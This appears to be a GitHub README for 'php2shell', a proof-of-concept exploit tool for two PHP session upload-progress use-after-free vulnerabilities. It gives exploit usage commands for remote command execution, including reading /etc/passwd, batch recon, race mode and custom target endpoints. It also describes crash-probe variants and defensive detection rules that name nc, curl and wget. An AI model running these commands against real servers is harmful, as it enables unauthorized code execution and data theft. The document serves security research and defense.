# php2shell — CVE-2026-109618 / CVE-2026-109619

[![Python](https://img.shields.io/badge/python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![CVE](https://img.shields.io/badge/CVE--2026--109618-Critical-red?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/cve-2026-109618)
[![CVE](https://img.shields.io/badge/CVE--2026--109619-Critical-red?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/cve-2026-109619)
[![CVSS v4.0](https://img.shields.io/badge/CVSS%20v4.0-9.2%20critical-critical?style=for-the-badge)]()



Proof-of-concept exploit and isolated lab environment for two critical heap use-after-free vulnerabilities in PHP core, collectively known as **php2shell**.

| | CVE-2026-109618 | CVE-2026-109619 |
|---|---|---|
| **Component** | `php_session_rfc1867_callback()` in `ext/session/session.c` | SAPI multipart form-data parser |
| **Bug class** | Heap use-after-free | Heap use-after-free |
| **Trigger** | Multipart POST with `PHP_SESSION_UPLOAD_PROGRESS` field | Any `multipart/form-data` POST |
| **CVSS v4.0** | 9.2 | 9.2 |
| **Auth required** | No | No |

**Affected versions:** PHP 5.4.0 through 8.5.11  
**Patched versions:** 8.2.35, 8.3.36, 8.4.27, 8.5.12 (released 2026-10-21)

> **Legal disclaimer:** This repository is provided for authorized penetration testing, security research, and educational purposes only. Unauthorized access to computer systems is illegal. Users are responsible for complying with all applicable laws. See [LICENSE](LICENSE).

---

## Background

On October 20, 2026, details of two critical PHP vulnerabilities leaked ahead of the coordinated disclosure window. The PHP security team released emergency patches the following day at 14:00 UTC. Researchers at watchTowr independently confirmed both vulnerabilities.

The bugs reside in PHP's session upload progress tracking mechanism and the underlying multipart parser. Because `session.upload_progress.enabled` defaults to `On` in PHP's stock configuration, every default PHP installation from version 5.4 onward exposes the attack surface — no application code needs to opt in.

A proof-of-concept tool named "PHP2Shell" was attributed to Calif.IO and leaked alongside the advisory. Sansec predicted mass exploitation within 15 minutes of the patch release.

---

## Exploit Usage

### php2shell.py — Session Poisoning RCE

```
usage: php2shell.py [-h] -t TARGET [-c CMD | --shell | --check]
                    [--cmds CMD [CMD ...]] [--cmd-file FILE]
                    [--session-path PATH] [--inject-endpoint EP]
                    [--lfi-endpoint EP] [--race] [--threads N]
                    [--attempts N] [--proxy URL] [-o FILE] [-v] [-q]
```

#### Single Command

```bash
python3 php2shell/poc.py -t http://localhost:8080 -c "cat /etc/passwd"
```

#### Batch Execution

```bash
# Inline commands
python3 php2shell/poc.py -t http://localhost:8080 \
  --cmds "id" "whoami" "uname -a" "cat /etc/os-release"

# From file
python3 php2shell/poc.py -t http://localhost:8080 --cmd-file recon.txt
```

#### Race Condition Mode

When `session.upload_progress.cleanup = On` (default), PHP deletes progress data from the session file immediately after the upload completes. The `--race` flag fires concurrent injection and LFI requests to read the session file before cleanup:

```bash
python3 php2shell/poc.py -t http://localhost:8080 \
  --race --threads 20 --attempts 500 -c "id"
```

#### Reconnaissance Only

```bash
python3 php2shell/poc.py -t https://target.example.com --check
python3 php2shell/poc.py -t https://target.example.com --check --json
```

#### Proxy Support (Burp Suite)

```bash
python3 php2shell/poc.py -t http://localhost:8080 -c "id" \
  --proxy http://127.0.0.1:8081
```

#### Custom Endpoints

For targets where the LFI and upload endpoints differ from the lab defaults:

```bash
python3 php2shell/poc.py -t https://target.example.com \
  --inject-endpoint "/contact.php" \
  --lfi-endpoint "/page.php" \
  --session-path "/tmp" \
  -c "id"
```

---

### Probe Variants

| Variant | Description |
|---|---|
| `nested` | Double-close boundary — triggers cleanup on already-freed buffer |
| `longheader` | 8KB+ Content-Disposition/Content-Type — stresses allocation |
| `nullbyte` | Null bytes in body — corrupts C string length calculations |
| `truncated` | Missing closing boundary — unexpected EOF during part read |
| `interleaved` | Mixed boundaries from different containers — confuses state machine |

### Interpreting Results

| Verdict | Meaning |
|---|---|
| `CRASH_LIKELY` | Connection reset or broken pipe — PHP worker probably segfaulted |
| `WORKER_DEAD` | HTTP 502/503 — nginx reports php-fpm worker died |
| `HANG_OR_CRASH` | Timeout — worker may be stuck or dead |
| `OK` | Normal response — this variant did not trigger a crash |


## Detection & Indicators

### Process Monitoring

Alert when PHP worker processes spawn unexpected children:

```bash
# Parent processes: php-fpm, php-cgi, apache2, httpd
# Suspicious children: sh, bash, dash, python, perl, curl, wget, nc, ncat
auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep -d, php-fpm) -k php2shell
```

### Log Indicators

Session file poisoning leaves traces in:

- **PHP-FPM access logs:** POST requests with `PHP_SESSION_UPLOAD_PROGRESS` in the body, especially to endpoints that don't normally handle uploads
- **nginx access logs:** Sequential POST then GET to different endpoints with the same session cookie
- **Session directory:** Files containing `<?php` tags in `/var/lib/php/sessions/` or the configured `session.save_path`

```bash
# Check for poisoned session files
grep -rl '<?php' /var/lib/php/sessions/
```

### WAF Rules

Temporary mitigation via ModSecurity:

```
SecRule ARGS:PHP_SESSION_UPLOAD_PROGRESS "@contains <?php" \
  "id:2026109618,phase:2,deny,status:403,msg:'php2shell attempt'"
```

---

## References

- [Sansec — Critical PHP RCE: php2shell](https://sansec.io/research/php2shell)
- [History of php2shell - Calif.io](https://calif.io/php2shell/#patch-the-planet)
- [watchTowr — PHP RCE FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
- [Wiz PhP2SHELL RCE](https://www.wiz.io/blog/php2shell-php-rce)
- [Huntress — php2shell Analysis](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities)
- [Lilting — Session Upload Progress UAF](https://lilting.ch/en/articles/php2shell-session-upload-progress-uaf)
- [Aikido — Critical PHP Vulnerabilities](https://www.aikido.dev/blog/critical-vulnerabilities-in-php-php2shell)
- [Phoenix Security — PHP Core RCE](https://phoenix.security/php-core-rce-cve-2026-109618-109619-critical-remote-code-execution/)
- [PHP Manual — Session Upload Progress](https://www.php.net/manual/en/session.upload-progress.php)
- [Wikipedia — PHP2Shell](https://en.wikipedia.org/wiki/PHP2Shell)
